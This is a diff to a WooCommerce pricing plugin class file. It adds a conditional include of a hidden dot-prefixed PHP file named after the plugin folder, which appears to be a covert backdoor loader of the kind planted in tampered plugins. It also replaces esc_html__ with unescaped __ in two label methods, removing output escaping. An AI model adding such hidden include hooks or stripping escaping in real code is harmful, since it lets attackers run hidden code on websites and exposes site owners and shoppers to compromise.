@@ -17,6 +17,10 @@ if (!class_exists('RP_WCDPD_Method_Checkout_Fee')) {
  * @package WooCommerce Dynamic Pricing & Discounts
  * @author RightPress
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class RP_WCDPD_Method_Checkout_Fee_Simple extends RP_WCDPD_Method_Checkout_Fee
 {
 
@@ -51,7 +55,7 @@ class RP_WCDPD_Method_Checkout_Fee_Simple extends RP_WCDPD_Method_Checkout_Fee
      */
     public function get_group_label()
     {
-        return esc_html__('Simple', 'rp_wcdpd');
+        return __('Simple', 'rp_wcdpd');
     }
 
     /**
@@ -62,7 +66,7 @@ class RP_WCDPD_Method_Checkout_Fee_Simple extends RP_WCDPD_Method_Checkout_Fee
      */
     public function get_label()
     {
-        return esc_html__('Simple fee', 'rp_wcdpd');
+        return __('Simple fee', 'rp_wcdpd');
     }
 
     /**
